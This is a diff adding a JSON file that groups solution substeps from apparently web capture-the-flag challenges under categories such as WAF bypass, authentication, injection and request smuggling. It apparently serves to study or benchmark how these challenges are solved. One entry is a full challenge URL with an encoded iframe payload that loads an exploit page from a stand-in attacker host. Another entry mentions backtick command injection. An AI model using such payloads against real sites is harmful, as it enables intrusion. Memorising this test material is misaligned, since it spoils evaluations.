@@ -1,0 +1,60 @@
+{
+    "Abuse of Attributes": [
+        "Abused the type attribute."
+    ],
+    "Bypass Techniques": [
+        "Identify the goal: Bypass a WAF (Web Application Firewall).",
+        "Understand the list of blocked keywords/functions in the source PHP code",
+        "Notice lack of content verification or removal of unwanted content",
+        "Included code in the payload to return the flag as the username",
+        "Attempt SQL injection using MySQL comments in place of spaces.",
+        "Take advantage of the Flask server's failure to comply with RFC norms",
+        "Discover that HTML injection is possible"
+    ],
+    "JavaScript Manipulation": [
+        "Run the written JavaScript"
+    ],
+    "Authentication & Authorization": [
+        "Find a cookie that contains a JWT hashed with HS256.",
+        "Observe the redirection upon successful authentication.",
+        "Discover that the 'auth' cookie was previously set in 'gethash.sh'"
+    ],
+    "File Manipulation": [
+        "Locate 2 'users.db' files.",
+        "Dumped the database.",
+        "Scour the page source and Javascript files to locate the token."
+    ],
+    "Payload Generation & Injection": [
+        "URL format: `http://challenge.nahamcon.com:32132/exploit?text=%3Ciframe%20src=%22https://ATTACKER_URL/exploit.html%22%3E&color=%2324d600`",
+        "Discovered that the 'DB_SECRET' is stored in another table.",
+        "Inject an address into the URL parameter.",
+        "Devise the exploit."
+    ],
+    "Network Analysis": [
+        "Utilize the network tab in the browser's developer tools."
+    ],
+    "API & Endpoint Manipulation": [
+        "Use the /find endpoint."
+    ],
+    "Data Analysis & Validation": [
+        "Conduct an analysis on the resulting PNG file.",
+        "Successfully complete the POST request with all required parameters.",
+        "Investigated the search function.",
+        "Verified it returns data for user ID 1.",
+        "Specify the number range to be checked.",
+        "Discovered that the app uses local storage to save notes."
+    ],
+    "Command Execution": [
+        "Send the composed POST request via curl.",
+        "List the files using the backtick-enclosed 'ls' command."
+    ],
+    "HTTP Request Manipulation": [
+        "Use HTTP request smuggling techniques"
+    ],
+    "Puzzle Solving": [
+        "Determined the solution for the crossword puzzle."
+    ],
+    "Repetition & Iteration": [
+        "Repeat the previous substep 4 more times"
+    ]
+}
